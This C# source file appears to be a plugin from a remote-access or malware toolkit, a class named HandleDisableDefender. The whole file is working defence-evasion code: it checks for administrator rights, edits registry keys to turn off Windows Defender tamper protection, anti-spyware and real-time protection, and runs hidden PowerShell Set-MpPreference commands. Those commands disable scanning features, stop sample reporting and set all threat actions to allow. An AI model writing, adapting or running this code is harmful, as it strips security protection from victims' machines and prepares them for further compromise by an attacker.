using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.Principal;
using System.Text;

namespace Plugin.Handler
{
    class HandleDisableDefender
    {
        public void Run()
        {
            Debug.WriteLine("Plugin Invoked");
            if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)) return;

            RegistryEdit(@"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", "0"); //Windows 10 1903 Redstone 6
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "1");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", "1");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", "1");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");

            CheckDefender();
        }

        private void RegistryEdit(string regPath, string name, string value)
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
                {
                    if (key == null)
                    {
                        Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
                        return;
                    }
                    if (key.GetValue(name) != (object)value)
                        key.SetValue(name, value, RegistryValueKind.DWord);
                }
            }
            catch { }
        }

        private void CheckDefender()
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = "Get-MpPreference -verbose",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
            while (!proc.StandardOutput.EndOfStream)
            {
                string line = proc.StandardOutput.ReadLine();

                if (line.Contains(@"DisableRealtimeMonitoring") && line.Contains("False"))
                    RunPS("Set-MpPreference -DisableRealtimeMonitoring $true"); //real-time protection

                else if (line.Contains(@"DisableBehaviorMonitoring") && line.Contains("False"))
                    RunPS("Set-MpPreference -DisableBehaviorMonitoring $true"); //behavior monitoring

                else if (line.Contains(@"DisableBlockAtFirstSeen") && line.Contains("False"))
                    RunPS("Set-MpPreference -DisableBlockAtFirstSeen $true");

                else if (line.Contains(@"DisableIOAVProtection") && line.Contains("False"))
                    RunPS("Set-MpPreference -DisableIOAVProtection $true"); //scans all downloaded files and attachments

                else if (line.Contains(@"DisablePrivacyMode") && line.Contains("False"))
                    RunPS("Set-MpPreference -DisablePrivacyMode $true"); //displaying threat history

                else if (line.Contains(@"SignatureDisableUpdateOnStartupWithoutEngine") && line.Contains("False"))
                    RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"); //definition updates on startup

                else if (line.Contains(@"DisableArchiveScanning") && line.Contains("False"))
                    RunPS("Set-MpPreference -DisableArchiveScanning $true"); //scan archive files, such as .zip and .cab files

                else if (line.Contains(@"DisableIntrusionPreventionSystem") && line.Contains("False"))
                    RunPS("Set-MpPreference -DisableIntrusionPreventionSystem $true"); // network protection 

                else if (line.Contains(@"DisableScriptScanning") && line.Contains("False"))
                    RunPS("Set-MpPreference -DisableScriptScanning $true"); //scanning of scripts during scans

                else if (line.Contains(@"SubmitSamplesConsent") && !line.Contains("2"))
                    RunPS("Set-MpPreference -SubmitSamplesConsent 2"); //MAPSReporting 

                else if (line.Contains(@"MAPSReporting") && !line.Contains("0"))
                    RunPS("Set-MpPreference -MAPSReporting 0"); //MAPSReporting 

                else if (line.Contains(@"HighThreatDefaultAction") && !line.Contains("6"))
                    RunPS("Set-MpPreference -HighThreatDefaultAction 6 -Force"); // high level threat // Allow

                else if (line.Contains(@"ModerateThreatDefaultAction") && !line.Contains("6"))
                    RunPS("Set-MpPreference -ModerateThreatDefaultAction 6"); // moderate level threat

                else if (line.Contains(@"LowThreatDefaultAction") && !line.Contains("6"))
                    RunPS("Set-MpPreference -LowThreatDefaultAction 6"); // low level threat

                else if (line.Contains(@"SevereThreatDefaultAction") && !line.Contains("6"))
                    RunPS("Set-MpPreference -SevereThreatDefaultAction 6"); // severe level threat
            }
        }

        private void RunPS(string args)
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = args,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
        }

    }
}
